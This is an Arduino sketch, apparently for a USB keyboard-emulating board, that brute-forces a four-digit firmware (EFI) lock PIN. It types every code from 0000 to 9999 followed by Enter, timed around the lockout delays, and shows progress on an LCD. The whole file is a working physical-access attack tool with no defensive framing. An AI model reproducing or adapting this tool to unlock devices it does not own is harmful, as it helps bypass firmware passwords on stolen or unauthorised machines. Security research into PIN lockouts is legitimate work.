#include <LiquidCrystal.h>

LiquidCrystal lcd(1, 2, 4, 5, 6, 7);

//EFI Pin bruteforce
const int ledPin = 13;
int set_min = 0000;
int set_max = 9999;
int counter = set_min;
//waits for iCould
int loops = 0;
int value0 = 0;
int value1 = 0;
int value2 = 0;
int value4 = 0;

int fakecounter = counter;
char pin[]="xxxx";
uint8_t buf[8] = { 0 }; /* Keyboard report buffer */

void setup() {
pinMode(ledPin, OUTPUT);
Serial.begin(9600);
randomSeed(analogRead(0));
lcd.begin(16,2);
lcd.print("EFI attack");
delay(200);
}

void loop(){
  
lcd.print(pin);
delay(200);

if (counter <= set_max){
delay(8000);
digitalWrite(ledPin, LOW);
delay(5500);
digitalWrite(ledPin, HIGH);
sprintf(pin, "%04d", fakecounter);

//First Digit 
int value0 = pin[0] - '0'; 
if (value0 == 0) {
  buf[3] = value0 + 39;
  } else {
    buf[3] = value0 + 29;
  }
Serial.write(buf, 8);
delay(300);
releaseKey();
delay(300);

//Second Digit
int value1 = pin[1] - '0'; 
if (value1 == 0) {
  buf[3] = value1 + 39;
  } else {
    buf[3] = value1 + 29;
  }
Serial.write(buf, 8);
delay(300);
releaseKey();
delay(300);


//Third Digit
int value2 = pin[2] - '0'; 
if (value2 == 0) {
  buf[3] = value2 + 39;
  } else {
    buf[3] = value2 + 29;
  }
Serial.write(buf, 8);
delay(300);
releaseKey();
delay(300);

//Forth Digit
int value3 = pin[3] - '0'; 
if (value3 == 0) {
  buf[3] = value3 + 39;
  } else {
    buf[3] = value3 + 29;
  }
Serial.write(buf, 8);
delay(300);
releaseKey();
delay(300);

//Enter Key
buf[3] = 40;
Serial.write(buf, 8);
delay(300);
releaseKey();

lcd.clear();
delay(200);
}

//reached 4 digit PIN max value
if (counter > set_max){
for (int blinkies = 0; blinkies < 8; blinkies++) {
digitalWrite(ledPin, HIGH);
delay(20);
digitalWrite(ledPin, LOW);
delay(200);
}
delay(6000);
}

++counter;
fakecounter = counter;
}

void releaseKey()
{
buf[0] = 0;
buf[2] = 0;
buf[3] = 0;
Serial.write(buf, 8); // Release key
}
